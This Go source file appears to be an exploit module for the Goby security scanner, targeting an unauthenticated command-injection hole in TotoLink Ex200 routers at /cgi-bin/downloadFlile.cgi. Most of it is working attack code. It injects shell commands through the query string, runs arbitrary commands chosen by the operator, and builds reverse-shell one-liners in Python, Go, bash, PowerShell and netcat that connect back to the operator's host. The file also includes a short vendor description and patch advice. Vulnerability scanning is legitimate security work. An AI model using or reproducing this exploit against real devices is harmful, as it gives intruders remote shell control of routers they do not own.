package exploits

import (
	"encoding/base64"
	"errors"
	"net/url"
	"strings"
	"time"
	"unicode/utf16"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "TotoLink Ex200 /cgi-bin/downloadFlile.cgi Command Execution Vulnerability",
    "Description": "<p>TOTOLINK is one of the world's leading network equipment suppliers integrating independent research and development, production, sales, OEM/ODM. Currently, TOTOLINK's product line covers: Wireless/wired routers, 4G&amp;5G routers, Repeaters, switches, NAS network storage, hubs, laptops, PCI network cards and various USB peripherals and other related products. </p><p>The TOTOLink Ex200 /cgi-bin/downloadFlile.cgi interface has a command execution vulnerability that could be exploited by an unauthenticated attacker to execute arbitrary commands and write backdoor files, exposing the entire web server to the risk of being compromised.</p>",
    "Product": "Totolink-Company-Products",
    "Homepage": "http://www.totolink.cn/",
    "DisclosureDate": "2022-08-18",
    "PostTime": "2024-08-14",
    "Author": "hhh3156",
    "FofaQuery": "title=\"TOTOLINK\" && body=\"TOTOLINK\"",
    "GobyQuery": "title=\"TOTOLINK\" && body=\"TOTOLINK\"",
    "Level": "3",
    "Impact": "<p>The TOTOLink Ex200 /cgi-bin/downloadFlile.cgi interface has a command execution vulnerability that could be exploited by an unauthenticated attacker to execute arbitrary commands and write backdoor files, exposing the entire web server to the risk of being compromised.</p>",
    "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:<a href=\"http://www.totolink.cn/\">http://www.totolink.cn/</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p> 3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "ls${IFS}/",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution",
        "2H1W"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.5",
    "Translation": {
        "CN": {
            "Name": "TotoLink Ex200 /cgi-bin/downloadFlile.cgi 命令执行漏洞",
            "Product": "TOTO_LINK-公司产品",
            "Description": "<p>TOTOLINK是集自主研发、生产、销售、OEM/ODM于一体的全球领先的网络设备供应商之一,目前，TOTOLINK产品线覆盖：无线/有线路由器、4G&amp;5G路由器、中继器、交换机、NAS网络存储、集线器、笔记本及PCI网卡和各种USB外设等相关产品。<br></p><p>TOTOLink Ex200 /cgi-bin/downloadFlile.cgi&nbsp; 接口存在命令执行漏洞，未经身份验证的攻击者可以利用此漏洞执行任意指令，写入后门文件，导致整个web服务器存在被控的风险。<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"http://www.totolink.cn/\">http://www.totolink.cn/</a></p><p>2、部署Web应用防火墙。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>TOTOLink&nbsp;Ex200 /cgi-bin/downloadFlile.cgi&nbsp;&nbsp;接口存在命令执行漏洞，未经身份验证的攻击者可以利用此漏洞执行任意指令，写入后门文件，导致整个web服务器存在被控的风险。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "TotoLink Ex200 /cgi-bin/downloadFlile.cgi Command Execution Vulnerability",
            "Product": "Totolink-Company-Products",
            "Description": "<p>TOTOLINK is one of the world's leading network equipment suppliers integrating independent research and development, production, sales, OEM/ODM. Currently, TOTOLINK's product line covers: Wireless/wired routers, 4G&amp;5G routers, Repeaters, switches, NAS network storage, hubs, laptops, PCI network cards and various USB peripherals and other related products.&nbsp;</p><p>The TOTOLink Ex200 /cgi-bin/downloadFlile.cgi interface has a command execution vulnerability that could be exploited by an unauthenticated attacker to execute arbitrary commands and write backdoor files, exposing the entire web server to the risk of being compromised.</p>",
            "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:<a href=\"http://www.totolink.cn/\">http://www.totolink.cn/</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>&nbsp;3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>The TOTOLink Ex200 /cgi-bin/downloadFlile.cgi interface has a command execution vulnerability that could be exploited by an unauthenticated attacker to execute arbitrary commands and write backdoor files, exposing the entire web server to the risk of being compromised.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9933"
}`

	setPayloadRequest_fjoijoPALVnue20a69fOAkf9q63PAl := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false

			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		command = strings.ReplaceAll(command, " ", "${IFS}")
		if strings.Contains(command, "&") {
			command = strings.ReplaceAll(command, "&", "%26")
		}
		if strings.Contains(command, "=") {
			command = strings.ReplaceAll(command, "=", "%3D")
		}
		if strings.Contains(command, "+") {
			command = strings.ReplaceAll(command, "+", "%2B")
		}

		path := `/cgi-bin/downloadFlile.cgi?;echo${IFS}"";` + command + `;=hahah`
		header := map[string]string{
			"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Accept":     "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
		}
		resp, err := setGetRequest(hostInfo, path, header)
		if err != nil || resp.StatusCode != 200 {
			return "", "", err
		}

		//command为原始命令，如果需编码，请自行编码后使用
		//漏洞url地址
		url := path

		//命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败
		commandResult := resp.RawBody

		return string(commandResult), url, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequest_fjoijoPALVnue20a69fOAkf9q63PAl

			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequest_fjoijoPALVnue20a69fOAkf9q63PAl

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				ReverseTcpByPython := func(rp string) string {
					return "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((" + godclient.GetGodServerHost() + "," + rp + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
				}
				ReverseTcpByGo := func(rp string) string {
					return "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"" + godclient.GetGodServerHost() + ":" + rp + "\");cmd:=exec.Command(\"/bin/bash\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
				}
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"ByPython":           ReverseTcpByPython,
					"ByGo":               ReverseTcpByGo,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
